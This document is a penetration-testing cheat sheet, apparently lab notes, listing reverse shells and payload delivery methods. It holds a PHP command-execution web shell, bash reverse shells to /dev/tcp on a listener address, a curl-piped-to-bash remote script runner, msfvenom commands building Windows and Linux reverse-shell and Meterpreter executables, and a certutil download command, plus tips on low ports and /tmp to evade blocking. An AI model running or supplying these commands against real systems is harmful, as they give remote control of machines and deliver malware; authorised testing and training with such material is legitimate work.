Use common low ports to avoid being blocked
### PHP
- Simple php shell
```php
<?php system($_REQUEST['cmd']); ?>
```
- for linux `PentestMonkey PHP shell`
- for windows use `Ivan Sincek` on [reverseshell.com](https://www.revshells.com/) 
### Bash
- Simple bash shell
```bash
/bin/bash -i >& /dev/tcp/192.168.45.209/80 0>&1
```

```bash
bash -c 'bash -i >& /dev/tcp/192.168.45.209/9090 0>&1'
```

```bash
curl -sSL http://192.168.45.209/rev.sh | bash
```
- Don't forget to check with other shells: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash


**More shells for different programming Language `/usr/share/webshells/`**
### Msfvenom

-  Staged - plain shell
```
msfvenom -p windows/shell/reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o shell.exe
```
- Stageless - plain shell
```
msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o shell.exe
```
- Stageless - linux
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 -f elf -o payload.elf
```
- Meterpreter | <span style="color:red"> Only for one target </span>
```msfvenom
msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f exe > shell.exe
```

- Common options:
  - `-p` — payload (e.g., `windows/meterpreter/reverse_tcp`)
  - `LHOST` / `LPORT` — listener host/port
  - `-f` — format (`exe`, `elf`, `raw`, `ps1`, `asp`, `jar`, `macho`, etc.)
  - `-a` / `--platform` — architecture/platform (e.g., `-a x64 --platform windows`)
  - `-b` — badchars to exclude
  - `-i` / `-e` — iterations and encoder (note: encoders do not reliably bypass modern AV)
  - `-x template.exe` — use a template binary
  - Redirect output with `> file` to save the generated payload
## Dependencies
- Auto python dependencies install
```bash
pip install pipreqs
pipreqs . --force
```

## Delivery
For Linux use
- wget - mostly available
- Use common low port - mostly not filtered or blocked
- use /tmp since anyone can write and execute

For windows use
```
C:\Windows\System32\certutil.exe -urlcache -split -f http://192.168.45.209/script.zip C:/Users/Public/script.zip
```
